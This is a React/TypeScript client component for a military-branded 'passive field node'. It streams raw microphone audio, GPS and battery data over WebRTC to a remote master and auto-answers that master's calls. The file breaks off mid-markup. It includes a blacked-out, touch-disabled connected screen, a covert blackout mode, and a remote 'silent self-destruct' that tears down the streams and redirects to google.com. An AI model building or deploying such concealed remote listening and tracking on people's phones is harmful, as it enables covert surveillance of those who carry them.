import React, { useEffect, useRef, useState, useCallback } from 'react';
import Peer, { DataConnection, MediaConnection } from 'peerjs';
import {
  Radio,
  ShieldAlert,
  Navigation,
  Lock,
  Mic,
  ArrowLeft,
  RefreshCw,
  Activity,
  BatteryCharging,
  QrCode,
  Smartphone,
  ScanLine,
  AlertTriangle,
  EyeOff,
} from 'lucide-react';
import { BarcodeModal } from './BarcodeModal';
import {
  setupPassiveAudio,
  silentSelfDestruct,
  type PassiveAudioPipeline,
} from './tacticalRemoteControl';
import { TacticalBlackout } from './TacticalBlackout';
import {
  setupNegotiation,
  unlockAudioAutoplay,
  type SignalingEnvelope,
} from './webrtcAudioEngine';

export interface TelemetryPayload {
  type: 'SIGMA_TELEMETRY';
  nodeId: string;
  peerId: string;
  lat: number | null;
  lng: number | null;
  alt: number | null;
  accuracy: number | null;
  speed: number | null;
  battery: number | null;
  charging: boolean | null;
  timestamp: number;
  audioRms: number;
  remoteGain: number;
  remoteMuted: boolean;
  connectionStatus: 'connected';
}

interface MasterCommandPayload {
  type:
    | 'SIGMA_REQUEST_AUDIO_STREAM'
    | 'SET_GAIN'
    | 'SET_MUTE'
    | 'EMERGENCY_WIPE'
    | 'SIGMA_SDP_RENEGOTIATE_OFFER'
    | 'SIGMA_SDP_RENEGOTIATE_ANSWER'
    | 'SIGMA_ICE_CANDIDATE';
  masterPeerId?: string;
  value?: number | boolean;
  sdp?: RTCSessionDescriptionInit;
  candidate?: RTCIceCandidateInit;
  nodeId?: string;
}

interface ClientProps {
  onExit: () => void;
  initialNodeId?: string;
  initialMasterPeerId?: string;
}

const LOGO_TNI_AU = '/assets/aistudio/images__10__b9efa126.jpeg';
const LOGO_PETIR = '/assets/aistudio/1794622160588-picsay_109de27f.png';

export const Client: React.FC<ClientProps> = ({
  onExit,
  initialNodeId,
  initialMasterPeerId,
}) => {
  const [nodeId, setNodeId] = useState<string>(() => {
    if (initialNodeId && /^\d{4}$/.test(initialNodeId)) {
      sessionStorage.setItem('sigma_node_4digit_id', initialNodeId);
      return initialNodeId;
    }
    const params = new URLSearchParams(window.location.search);
    const urlId = params.get('id');
    if (urlId && /^\d{4}$/.test(urlId)) {
      sessionStorage.setItem('sigma_node_4digit_id', urlId);
      return urlId;
    }
    const saved = sessionStorage.getItem('sigma_node_4digit_id');
    if (saved && /^\d{4}$/.test(saved)) return saved;
    const generated = String(Math.floor(1000 + Math.random() * 9000));
    sessionStorage.setItem('sigma_node_4digit_id', generated);
    return generated;
  });

  const [targetMasterId, setTargetMasterId] = useState<string | undefined>(() => {
    if (initialMasterPeerId) return initialMasterPeerId;
    const params = new URLSearchParams(window.location.search);
    return params.get('master') || undefined;
  });

  const [peerStatus, setPeerStatus] = useState<
    'INITIALIZING' | 'STANDBY_LISTENING' | 'CONNECTED' | 'ERROR'
  >('INITIALIZING');
  const [activeCallsCount, setActiveCallsCount] = useState<number>(0);
  const [dataPeersCount, setDataPeersCount] = useState<number>(0);
  const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
  const [micStatus, setMicStatus] = useState<'READY' | 'DENIED' | 'PENDING'>('PENDING');
  const [micError, setMicError] = useState<string | null>(null);
  const [audioRms, setAudioRms] = useState<number>(0);
  const [remoteAudioState, setRemoteAudioState] = useState<{
    gain: number;
    muted: boolean;
  }>({
    gain: 1.0,
    muted: false,
  });

  const [batteryInfo, setBatteryInfo] = useState<{
    level: number | null;
    charging: boolean | null;
  }>({
    level: null,
    charging: null,
  });

  const [gpsState, setGpsState] = useState<{
    lat: number | null;
    lng: number | null;
    alt: number | null;
    accuracy: number | null;
    speed: number | null;
    status: 'WAITING_GPS' | 'LOCKED' | 'PERMISSION_DENIED';
    lastSent: number | null;
  }>({
    lat: null,
    lng: null,
    alt: null,
    accuracy: null,
    speed: null,
    status: 'WAITING_GPS',
    lastSent: null,
  });

  const [barcodeModalOpen, setBarcodeModalOpen] = useState<boolean>(false);
  const [barcodeModalTab, setBarcodeModalTab] = useState<
    'CLIENT_JOIN' | 'SHARE_APK' | 'SCANNER'
  >('CLIENT_JOIN');

  const peerRef = useRef<Peer | null>(null);
  const rawStreamRef = useRef<MediaStream | null>(null);
  const outboundStreamRef = useRef<MediaStream | null>(null);
  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
  const dataConnsRef = useRef<Map<string, DataConnection>>(new Map());
  const mediaCallsRef = useRef<Map<string, MediaConnection>>(new Map());
  const negotiationHandlersRef = useRef<
    Map<string, ReturnType<typeof setupNegotiation>>
  >(new Map());
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const gpsRef = useRef(gpsState);
  const batteryRef = useRef(batteryInfo);
  const rmsRef = useRef(0);
  const remoteAudioStateRef = useRef(remoteAudioState);

  gpsRef.current = gpsState;
  batteryRef.current = batteryInfo;
  rmsRef.current = audioRms;
  remoteAudioStateRef.current = remoteAudioState;

  const ensureTracksOnPeerConnection = useCallback(
    (
      connOrCall: { peer: string; peerConnection?: RTCPeerConnection },
      stream: MediaStream
    ) => {
      const pc: RTCPeerConnection | undefined = connOrCall.peerConnection;
      if (!pc) return;

      const openDataConn = dataConnsRef.current.get(connOrCall.peer);
      if (!negotiationHandlersRef.current.has(connOrCall.peer)) {
        const negHandler = setupNegotiation(pc, {
          dataChannel: openDataConn || null,
          nodeId,
        });
        negotiationHandlersRef.current.set(connOrCall.peer, negHandler);
      }

      const senders = pc.getSenders ? pc.getSenders() : [];
      let trackAdded = false;
      stream.getTracks().forEach((track) => {
        track.enabled = !remoteAudioStateRef.current.muted;
        const existingSender = senders.find(
          (s) => s.track && s.track.kind === track.kind
        );
        if (existingSender && existingSender.track?.id !== track.id) {
          existingSender.replaceTrack(track).catch(() => {});
        } else if (!existingSender) {
          try {
            pc.addTrack(track, stream);
            trackAdded = true;
          } catch {}
        }
      });

      if (trackAdded) {
        negotiationHandlersRef.current
          .get(connOrCall.peer)
          ?.triggerManualRenegotiation()
          .catch(() => {});
      }
    },
    [nodeId]
  );

  const pushAudioStreamToMaster = useCallback(
    (masterPeerId: string) => {
      const peer = peerRef.current;
      const stream = outboundStreamRef.current || rawStreamRef.current;
      if (!peer || !peer.open || !stream) return;

      stream.getAudioTracks().forEach((t) => {
        t.enabled = !remoteAudioStateRef.current.muted;
      });

      const existingCall = mediaCallsRef.current.get(masterPeerId);
      if (existingCall && existingCall.open) {
        ensureTracksOnPeerConnection(existingCall, stream);
        return;
      }

      const call = peer.call(masterPeerId, stream, {
        metadata: { nodeId },
      });

      if (call) {
        ensureTracksOnPeerConnection(call, stream);
        mediaCallsRef.current.set(masterPeerId, call);
        setActiveCallsCount(mediaCallsRef.current.size);
        setPeerStatus('CONNECTED');

        call.on('close', () => {
          mediaCallsRef.current.delete(masterPeerId);
          setActiveCallsCount(mediaCallsRef.current.size);
          if (
            mediaCallsRef.current.size === 0 &&
            dataConnsRef.current.size === 0
          ) {
            setPeerStatus('STANDBY_LISTENING');
          }
        });

        call.on('error', () => {
          mediaCallsRef.current.delete(masterPeerId);
          setActiveCallsCount(mediaCallsRef.current.size);
        });
      }
    },
    [ensureTracksOnPeerConnection, nodeId]
  );

  // 1. Request Screen Wake Lock
  const requestWakeLock = useCallback(async () => {
    try {
      if ('wakeLock' in navigator && navigator.wakeLock) {
        const sentinel = await navigator.wakeLock.request('screen');
        wakeLockRef.current = sentinel;
        setWakeLockActive(true);
        sentinel.addEventListener('release', () => {
          setWakeLockActive(false);
        });
      }
    } catch {
      setWakeLockActive(false);
    }
  }, []);

  useEffect(() => {
    requestWakeLock();
    const handleVisibility = () => {
      if (document.visibilityState === 'visible') {
        requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibility);
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch(() => {});
      }
    };
  }, [requestWakeLock]);

  // 2. Real Hardware Battery Telemetry
  useEffect(() => {
    const nav = navigator as unknown as {
      getBattery?: () => Promise<{
        level: number;
        charging: boolean;
        addEventListener: (type: string, cb: () => void) => void;
      }>;
    };
    if (nav.getBattery) {
      nav
        .getBattery()
        .then((bat) => {
          const updateBat = () => {
            setBatteryInfo({
              level: Math.round(bat.level * 100),
              charging: bat.charging,
            });
          };
          updateBat();
          bat.addEventListener('levelchange', updateBat);
          bat.addEventListener('chargingchange', updateBat);
        })
        .catch(() => {});
    }
  }, []);

  // 3. Transmit Real GPS & Device Telemetry over WebRTC Data Channel
  const transmitTelemetryPacket = useCallback(
    (overrideCoords?: {
      lat: number | null;
      lng: number | null;
      alt: number | null;
      accuracy: number | null;
      speed: number | null;
    }) => {
      const coords = overrideCoords || gpsRef.current;
      const payload: TelemetryPayload = {
        type: 'SIGMA_TELEMETRY',
        nodeId,
        peerId: `sigma-node-${nodeId}`,
        lat: coords.lat,
        lng: coords.lng,
        alt: coords.alt,
        accuracy: coords.accuracy,
        speed: coords.speed,
        battery: batteryRef.current.level,
        charging: batteryRef.current.charging,
        timestamp: Date.now(),
        audioRms: rmsRef.current,
        remoteGain: remoteAudioStateRef.current.gain,
        remoteMuted: remoteAudioStateRef.current.muted,
        connectionStatus: 'connected',
      };

      let sentCount = 0;
      dataConnsRef.current.forEach((conn) => {
        if (conn.open) {
          try {
            conn.send(payload);
            sentCount++;
          } catch {}
        }
      });

      if (sentCount > 0) {
        setGpsState((prev) => ({ ...prev, lastSent: Date.now() }));
      }
    },
    [nodeId]
  );

  // 4. Raw Ambient Audio Capture + `setupPassiveAudio(mediaStream, dataChannel)`
  useEffect(() => {
    let rafId: number | null = null;
    let isMounted = true;

    async function initRealMicrophone() {
      const rawConstraints: MediaStreamConstraints = {
        audio: {
          echoCancellation: false,
          noiseSuppression: false,
          autoGainControl: false,
        },
        video: false,
      };

      try {
        const capturedStream = await navigator.mediaDevices.getUserMedia(rawConstraints);
        if (!isMounted) {
          capturedStream.getTracks().forEach((t) => t.stop());
          return;
        }

        capturedStream.getTracks().forEach((track) => {
          track.enabled = true;
        });

        rawStreamRef.current = capturedStream;

        // Inisialisasi pipeline pasif dengan GainNode yang dikontrol penuh dari Master via DataChannel
        const pipeline = setupPassiveAudio(
          capturedStream,
          null,
          {
            getExtraStreams: () => [rawStreamRef.current],
            getPeerConnections: () => [
              ...Array.from(dataConnsRef.current.values()),
              ...Array.from(mediaCallsRef.current.values()),
            ],
            getPeerInstance: () => peerRef.current,
          },
          (updatedState) => {
            setRemoteAudioState(updatedState);
            setTimeout(() => transmitTelemetryPacket(), 30);
          }
        );

        passivePipelineRef.current = pipeline;
        outboundStreamRef.current = pipeline.processedStream;

        // Ikat semua DataChannel yang sudah terbuka ke pipeline pasif
        dataConnsRef.current.forEach((conn) => {
          pipeline.bindDataChannel(conn as unknown as Parameters<typeof pipeline.bindDataChannel>[0]);
        });

        setMicStatus('READY');
        setMicError(null);

        // Dorong stream audio yang sudah melewati GainNode ke Master (baik via MediaConnection maupun DataConnection PeerConnection)
        mediaCallsRef.current.forEach((call) => {
          ensureTracksOnPeerConnection(call, pipeline.processedStream);
        });
        dataConnsRef.current.forEach((conn) => {
          if (conn.open) {
            ensureTracksOnPeerConnection(conn, pipeline.processedStream);
            pushAudioStreamToMaster(conn.peer);
          }
        });
        if (targetMasterId) {
          pushAudioStreamToMaster(targetMasterId);
        }

        const analyser = pipeline.audioContext.createAnalyser();
        analyser.fftSize = 256;
        pipeline.gainNode.connect(analyser);
        const data = new Uint8Array(analyser.frequencyBinCount);

        const updateMeter = () => {
          if (!isMounted) return;
          analyser.getByteTimeDomainData(data);
          let sum = 0;
          for (let i = 0; i < data.length; i++) {
            const norm = (data[i] - 128) / 128;
            sum += norm * norm;
          }
          const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
          setAudioRms(rms);
          rafId = requestAnimationFrame(updateMeter);
        };
        updateMeter();
      } catch (err) {
        if (isMounted) {
          setMicStatus('DENIED');
          setMicError(
            err instanceof Error
              ? err.message
              : 'Izin mikrofon ditolak atau perangkat audio tidak ditemukan.'
          );
        }
      }
    }

    initRealMicrophone();

    return () => {
      isMounted = false;
      if (rafId) cancelAnimationFrame(rafId);
      if (rawStreamRef.current) {
        rawStreamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (outboundStreamRef.current) {
        outboundStreamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (
        passivePipelineRef.current &&
        passivePipelineRef.current.audioContext.state !== 'closed'
      ) {
        passivePipelineRef.current.audioContext.close().catch(() => {});
      }
    };
  }, [
    ensureTracksOnPeerConnection,
    pushAudioStreamToMaster,
    targetMasterId,
    transmitTelemetryPacket,
  ]);

  // 5. Real Hardware Geolocation + 10-Second WebRTC DataChannel Interval
  useEffect(() => {
    if (!('geolocation' in navigator)) {
      setGpsState((prev) => ({ ...prev, status: 'PERMISSION_DENIED' }));
      return;
    }

    let watchId: number | null = null;

    const fetchHardwareGps = () => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const nextCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
            accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
            speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
          };
          setGpsState((prev) => ({
            ...prev,
            ...nextCoords,
            status: 'LOCKED',
          }));
          transmitTelemetryPacket(nextCoords);
        },
        () => {
          setGpsState((prev) => ({
            ...prev,
            status: prev.lat !== null ? 'LOCKED' : 'PERMISSION_DENIED',
          }));
          transmitTelemetryPacket();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    };

    fetchHardwareGps();

    watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const nextCoords = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
          accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
          speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
        };
        setGpsState((prev) => ({
          ...prev,
          ...nextCoords,
          status: 'LOCKED',
        }));
        transmitTelemetryPacket(nextCoords);
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 5000 }
    );

    const intervalId = window.setInterval(() => {
      fetchHardwareGps();
    }, 10000);

    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
      clearInterval(intervalId);
    };
  }, [transmitTelemetryPacket]);

  // Handler untuk paket komando & SDP Renegotiation dari Master melalui DataChannel
  const attachMasterDataChannelListeners = useCallback(
    (conn: DataConnection) => {
      if (passivePipelineRef.current) {
        passivePipelineRef.current.bindDataChannel(
          conn as unknown as Parameters<typeof passivePipelineRef.current.bindDataChannel>[0]
        );
      }

      // Pasang SDP Renegotiation Handler pada RTCPeerConnection milik DataConnection
      if (conn.peerConnection) {
        const negHandler = setupNegotiation(conn.peerConnection, {
          dataChannel: conn,
          nodeId,
        });
        negotiationHandlersRef.current.set(conn.peer, negHandler);
      }

      conn.on('data', (raw) => {
        let msg: MasterCommandPayload | null = null;
        if (typeof raw === 'string') {
          try {
            msg = JSON.parse(raw) as MasterCommandPayload;
          } catch {}
        } else if (raw && typeof raw === 'object') {
          msg = raw as MasterCommandPayload;
        }

        if (!msg || !msg.type) return;

        // Jika menerima paket SDP Renegotiation Offer/Answer atau ICE Candidate
        if (
          msg.type === 'SIGMA_SDP_RENEGOTIATE_OFFER' ||
          msg.type === 'SIGMA_SDP_RENEGOTIATE_ANSWER' ||
          msg.type === 'SIGMA_ICE_CANDIDATE'
        ) {
          const handler = negotiationHandlersRef.current.get(conn.peer);
          if (handler) {
            handler.handleRemoteSignal(msg as SignalingEnvelope).catch(() => {});
          }
          return;
        }

        // Jika menerima EMERGENCY_WIPE sebelum pipeline selesai inisialisasi, tetap eksekusi silentSelfDestruct
        if (msg.type === 'EMERGENCY_WIPE') {
          silentSelfDestruct({
            streams: [rawStreamRef.current, outboundStreamRef.current],
            peerConnections: [
              ...Array.from(dataConnsRef.current.values()),
              ...Array.from(mediaCallsRef.current.values()),
            ],
            peerInstance: peerRef.current,
            audioContext: passivePipelineRef.current?.audioContext,
            redirectUrl: 'https://www.google.com',
          });
          return;
        }

        if (msg.type === 'SIGMA_REQUEST_AUDIO_STREAM' && msg.masterPeerId) {
          const activeStream = outboundStreamRef.current || rawStreamRef.current;
          if (activeStream) {
            ensureTracksOnPeerConnection(conn, activeStream);
          }
          pushAudioStreamToMaster(msg.masterPeerId);
        }
      });
    },
    [ensureTracksOnPeerConnection, nodeId, pushAudioStreamToMaster]
  );

  const dialMasterPeer = useCallback(
    (masterPeerId: string, peerInstance: Peer) => {
      if (!peerInstance.open) return;

      if (!dataConnsRef.current.has(masterPeerId)) {
        const conn = peerInstance.connect(masterPeerId, {
          metadata: { nodeId },
          reliable: true,
        });
        conn.on('open', () => {
          dataConnsRef.current.set(masterPeerId, conn);
          setDataPeersCount(dataConnsRef.current.size);
          setPeerStatus('CONNECTED');
          attachMasterDataChannelListeners(conn);
          transmitTelemetryPacket();
          if (outboundStreamRef.current || rawStreamRef.current) {
            pushAudioStreamToMaster(masterPeerId);
          }
        });
        conn.on('close', () => {
          dataConnsRef.current.delete(masterPeerId);
          setDataPeersCount(dataConnsRef.current.size);
          if (
            dataConnsRef.current.size === 0 &&
            mediaCallsRef.current.size === 0
          ) {
            setPeerStatus('STANDBY_LISTENING');
          }
        });
      }

      if (outboundStreamRef.current || rawStreamRef.current) {
        pushAudioStreamToMaster(masterPeerId);
      }
    },
    [
      attachMasterDataChannelListeners,
      nodeId,
      pushAudioStreamToMaster,
      transmitTelemetryPacket,
    ]
  );

  // 6. PeerJS P2P Setup & Hands-Free Auto-Answer
  useEffect(() => {
    setPeerStatus('INITIALIZING');
    const peerId = `sigma-node-${nodeId}`;
    const peer = new Peer(peerId, { debug: 0 });
    peerRef.current = peer;

    peer.on('open', () => {
      setPeerStatus('STANDBY_LISTENING');
      if (targetMasterId) {
        dialMasterPeer(targetMasterId, peer);
      }
    });

    peer.on('call', (incomingCall) => {
      const answerCall = (retriesLeft: number) => {
        const stream = outboundStreamRef.current || rawStreamRef.current;
        if (stream) {
          stream.getAudioTracks().forEach((t) => {
            t.enabled = !remoteAudioStateRef.current.muted;
          });
          incomingCall.answer(stream);
          ensureTracksOnPeerConnection(incomingCall, stream);

          mediaCallsRef.current.set(incomingCall.peer, incomingCall);
          setActiveCallsCount(mediaCallsRef.current.size);
          setPeerStatus('CONNECTED');

          incomingCall.on('close', () => {
            mediaCallsRef.current.delete(incomingCall.peer);
            setActiveCallsCount(mediaCallsRef.current.size);
            if (
              mediaCallsRef.current.size === 0 &&
              dataConnsRef.current.size === 0
            ) {
              setPeerStatus('STANDBY_LISTENING');
            }
          });
        } else if (retriesLeft > 0) {
          setTimeout(() => answerCall(retriesLeft - 1), 350);
        }
      };
      answerCall(25);
    });

    peer.on('connection', (conn) => {
      conn.on('open', () => {
        dataConnsRef.current.set(conn.peer, conn);
        setDataPeersCount(dataConnsRef.current.size);
        setPeerStatus('CONNECTED');
        attachMasterDataChannelListeners(conn);
        transmitTelemetryPacket();

        const activeStream = outboundStreamRef.current || rawStreamRef.current;
        if (activeStream) {
          ensureTracksOnPeerConnection(conn, activeStream);
          pushAudioStreamToMaster(conn.peer);
        }
      });

      conn.on('close', () => {
        dataConnsRef.current.delete(conn.peer);
        setDataPeersCount(dataConnsRef.current.size);
        if (
          dataConnsRef.current.size === 0 &&
          mediaCallsRef.current.size === 0
        ) {
          setPeerStatus('STANDBY_LISTENING');
        }
      });
    });

    peer.on('error', () => {
      setPeerStatus('ERROR');
    });

    return () => {
      dataConnsRef.current.forEach((c) => c.close());
      mediaCallsRef.current.forEach((c) => c.close());
      dataConnsRef.current.clear();
      mediaCallsRef.current.clear();
      peer.destroy();
    };
  }, [
    nodeId,
    targetMasterId,
    attachMasterDataChannelListeners,
    dialMasterPeer,
    ensureTracksOnPeerConnection,
    pushAudioStreamToMaster,
    transmitTelemetryPacket,
  ]);

  const handleRegenerateNodeId = (newId: string) => {
    sessionStorage.setItem('sigma_node_4digit_id', newId);
    setNodeId(newId);
  };

  /**
   * ARSITEKTUR MASTER-PASSIVE CLIENT:
   * Begitu Klien terhubung (`peerStatus === 'CONNECTED'`), layar HP Klien bersifat 100% PASIF
   * tanpa tombol interaktif sama sekali. Seluruh fungsi (Gain, Mute, Emergency Wipe)
   * dikendalikan secara remote dari Master melalui WebRTC DataChannel.
   */
  if (peerStatus === 'CONNECTED') {
    return (
      <div className="fixed inset-0 bg-black text-neutral-900 flex flex-col justify-between p-4 select-none pointer-events-none z-[9999] font-mono-tactical">
        <div className="flex items-center justify-between opacity-20">
          <div className="flex items-center gap-2">
            <img
              src={LOGO_TNI_AU}
              alt="TNI AU"
              referrerPolicy="no-referrer"
              className="w-5 h-5 object-contain rounded-full"
            />
            <span className="text-[10px] tracking-widest text-neutral-700">
              S.I.G.M.A PASSIVE NODE // {nodeId}
            </span>
          </div>
          <img
            src={LOGO_PETIR}
            alt="Diskomlekau"
            referrerPolicy="no-referrer"
            className="w-5 h-5 object-contain rounded-full"
          />
        </div>

        <div className="my-auto text-center space-y-1 opacity-15">
          <div className="text-xs tracking-[0.3em] text-neutral-700">
            PASSIVE TELEMETRY LOCKED
          </div>
          <div className="text-[10px] text-neutral-800">
            GAIN: {remoteAudioState.gain.toFixed(1)}x · MIC:{' '}
            {remoteAudioState.muted ? 'REMOTE MUTED' : 'LIVE'} · WAKE LOCK:{' '}
            {wakeLockActive ? 'ON' : 'OFF'}
          </div>
        </div>

        <div className="text-center text-[9px] tracking-widest text-neutral-900">
          REMOTE CONTROLLED BY MASTER VIA WEBRTC DATACHANNEL
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-slate-300 font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none">
      <BarcodeModal
        isOpen={barcodeModalOpen}
        onClose={() => setBarcodeModalOpen(false)}
        initialTab={barcodeModalTab}
        defaultNodeId={nodeId}
        masterPeerId={targetMasterId}
        onScanNodeId={(scannedId, scannedMasterId) => {
          handleRegenerateNodeId(scannedId);
          if (scannedMasterId) {
            setTargetMasterId(scannedMasterId);
          }
        }}
      />

      {/* Top Minimalist Bar: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-neutral-900 pb-3">
        <div className="flex items-center gap-2.5">
          <img
            src={LOGO_TNI_AU}
            alt="Logo TNI AU"
            referrerPolicy="no-referrer"
            className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
          />

          <button
            onClick={onExit}
            className="flex items-center gap-1 px-2 py-1 text-xs text-neutral-400 hover:text-cyan-400 bg-neutral-950 border border-neutral-800 rounded transition-colors cursor-pointer"
          >
            <ArrowLeft className="w-3.5 h-3.5" />
            <span>MODE</span>
          </button>

          <span className="text-xs tracking-widest text-neutral-500 hidden sm:inline">
            S.I.G.M.A // PASSIVE FIELD NODE
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => TacticalBlackout.engage()}
            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-neutral-300 bg-neutral-950 border border-neutral-800 hover:border-cyan-400 rounded transition-colors cursor-pointer"
            title="Covert/Blackout Mode (Ketuk 5x cepat < 2 detik untuk keluar)"
          >
            <EyeOff className="w-3.5 h-3.5 text-cyan-400" />
            <span>BLACKOUT</span>
          </button>

          <button
            onClick={() => {
              setBarcodeModalTab('CLIENT_JOIN');
              setBarcodeModalOpen(true);
            }}
            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-cyan-300 bg-neutral-950 border border-cyan-900/60 hover:border-cyan-400 rounded transition-colors cursor-pointer"
          >
            <QrCode className="w-3.5 h-3.5 text-cyan-400" />
            <span>QR BARCODE</span>
          </button>

          <button
            onClick={() => {
              setBarcodeModalTab('SHARE_APK');
              setBarcodeModalOpen(true);
            }}
            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-emerald-300 bg-neutral-950 border border-emerald-900/60 hover:border-emerald-400 rounded transition-colors cursor-pointer"
          >
            <Smartphone className="w-3.5 h-3.5 text-emerald-400" />
            <span>SHARE APK</span>
          </button>

          <img
            src={LOGO_PETIR}
            alt="Logo Petir Diskomlekau"
            referrerPolicy="no-referrer"
            className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
          />
        </div>
      </div>

      {/* Center Minimalist Telemetry Unit (Only visible before Master connects) */}
      <div className="my-auto max-w-md w-full mx-auto space-y-5 py-6">
        {micError && (
          <div className="border border-red-500/50 bg-red-950/30 text-red-300 p-3 rounded text-xs flex items-start gap-2">
            <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
            <div>
              <div className="font-bold">MIKROFON BELUM AKTIF</div>
              <div className="text-[11px] text-red-200/80 mt-0.5">{micError}</div>
            </div>
          </div>
        )}

        <div className="border border-neutral-900 bg-neutral-950/40 rounded p-6 text-center space-y-3">
          <div className="flex items-center justify-center gap-2 text-xs text-neutral-500 tracking-widest">
            <Radio className="w-3.5 h-3.5 text-cyan-500" />
            <span>PASSIVE NODE ID (LAYAR TERKUNCI SAAT KONEK)</span>
          </div>

          <div className="text-5xl sm:text-6xl font-bold tracking-widest text-cyan-400 font-mono-tactical">
            {nodeId}
          </div>

          <div className="text-[11px] text-neutral-500">
            PEER ADDR: <span className="text-neutral-400">sigma-node-{nodeId}</span>
            {targetMasterId && (
              <div className="text-emerald-400 mt-1">
                MENUNGGU HANDSHAKE MASTER: {targetMasterId}
              </div>
            )}
          </div>

          <div className="pt-2 flex items-center justify-center">
            <button
              onClick={() =>
                handleRegenerateNodeId(String(Math.floor(1000 + Math.random() * 9000)))
              }
              className="px-3 py-1 text-[11px] rounded border border-neutral-800 bg-black text-neutral-400 hover:text-cyan-300 flex items-center gap-1.5 cursor-pointer"
              title="Generate New 4-Digit ID"
            >
              <RefreshCw className="w-3 h-3" />
              <span>GENERATE NEW 4-DIGIT ID</span>
            </button>
          </div>

          <div className="pt-3 grid grid-cols-2 gap-2">
            <button
              onClick={() => {
                setBarcodeModalTab('CLIENT_JOIN');
                setBarcodeModalOpen(true);
              }}
              className="flex items-center justify-center gap-1.5 py-2 px-3 text-xs font-semibold bg-cyan-950/40 border border-cyan-500/50 text-cyan-300 rounded hover:bg-cyan-900/40 cursor-pointer"
            >
              <QrCode className="w-3.5 h-3.5" />
              <span>TAMPILKAN BARCODE</span>
            </button>

            <button
              onClick={() => {
                setBarcodeModalTab('SCANNER');
                setBarcodeModalOpen(true);
              }}
              className="flex items-center justify-center gap-1.5 py-2 px-3 text-xs font-semibold bg-amber-950/40 border border-amber-500/50 text-amber-300 rounded hover:bg-amber-900/40 cursor-pointer"
            >
              <ScanLine className="w-3.5 h-3.5" />
              <span>SCAN MASTER QR</span>
            </button>
          </div>
        </div>

        {/* Minimalist Status Matrix */}
        <div className="grid grid-cols-2 gap-2.5 text-xs">
          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">RTCPeerConnection</div>
            <div className="flex items-center gap-2 font-semibold">
              <span
                className={`w-2 h-2 rounded-full ${
                  peerStatus === 'ERROR' ? 'bg-red-500' : 'bg-cyan-500 animate-pulse'
                }`}
              />
              <span className={peerStatus === 'ERROR' ? 'text-red-400' : 'text-cyan-400'}>
                {peerStatus === 'STANDBY_LISTENING'
                  ? 'MENUNGGU MASTER...'
                  : peerStatus}
              </span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">WAKE LOCK</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Lock className="w-3.5 h-3.5 text-cyan-500" />
              <span>{wakeLockActive ? 'SCREEN LOCKED' : 'UNSUPPORTED / INACTIVE'}</span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">PASSIVE GAIN NODE</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Mic className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {micStatus === 'READY'
                  ? `READY (${remoteAudioState.gain.toFixed(1)}x)`
                  : micStatus === 'DENIED'
                  ? 'MIC BLOCKED'
                  : 'INITIALIZING...'}
              </span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">BATTERY / DATA CH</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <BatteryCharging className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'N/A'} ·{' '}
                {dataPeersCount} CH
              </span>
            </div>
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-2">
          <div className="flex items-center justify-between text-[11px] text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-500" />
              <span>RAW INPUT MODULATION (EC: OFF · NS: OFF · AGC: OFF)</span>
            </span>
            <span className="text-cyan-400">{audioRms}%</span>
          </div>
          <div className="w-full h-1.5 bg-neutral-950 rounded overflow-hidden">
            <div
              className="h-full bg-cyan-500 transition-all duration-75"
              style={{ width: `${Math.min(100, audioRms)}%` }}
            />
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-1.5 text-[11px]">
          <div className="flex items-center justify-between text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Navigation className="w-3.5 h-3.5 text-cyan-500" />
              <span>REAL GPS TELEMETRY (10s WEBRTC DATA CHANNEL)</span>
